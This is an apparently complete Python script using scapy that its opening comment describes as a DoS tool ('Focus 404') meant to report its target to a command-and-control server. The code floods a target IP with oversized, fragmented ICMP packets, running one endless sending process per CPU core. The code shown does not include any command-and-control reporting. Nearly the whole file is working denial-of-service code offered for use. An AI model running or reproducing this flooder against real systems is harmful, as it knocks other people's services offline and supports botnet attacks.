# Focus 404 is intended to dos a specific target and then report back to the CNC which target was selected
import getopt
import logging
import sys
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import time
import multiprocessing
from multiprocessing import Process

def sendPings(destIp, interface):
	s = conf.L3socket(iface=interface)
	payload = ("X"*60000)
	try:
		ip_hdr = IP(dst=destIp)
		packet = ip_hdr/ICMP(id=65535, seq=65535)/payload
		sendp(fragment(packet),iface=interface,verbose = False)
		while True:
			s.send(packet)
	except KeyboardInterrupt:
		print ("Stopped the attack")
		sys.exit(0)
		quit()

def main():
	if not len(sys.argv[1:]):
		usage()
	try:
		opts, args = getopt.getopt(sys.argv[1:],"hle:t:i:p:",["help","target","interface","processes"])
	except getopt.GetoptError as err:
		print (str(err))
		usage()

	destinationIp   = None
	interface       = None
	processCount	= multiprocessing.cpu_count()			

	for o,a in opts:
		if o in ("-h", "--help"):
			usage()
		elif o in ("-t","--target"):
			destinationIp = a
		elif o in ("-i","--interface"):
			interface = a
		elif o in ("-p", "--processes"):
			processCount = int(a)
		else:
			assert False, "Unhandled option"

	if not destinationIp or not interface:
		usage()
	else:
		print ("[+] Starting attack (%i pingers)..." % (processCount))
		for processNumber in range(processCount):
			#This section below will use all the cores on a cpu at 100%
			pinger = Process(name="pinger%i" % (processNumber), target=sendPings, args=(destinationIp, interface))
			pinger.daemon = True
			pinger.start()
		while True:
			try:
				time.sleep(.1)
			except KeyboardInterrupt:
				print ("[+] Stopped the attack")
				pinger.terminate()
				sys.exit(0)
				quit()

if __name__ == "__main__":
	main()
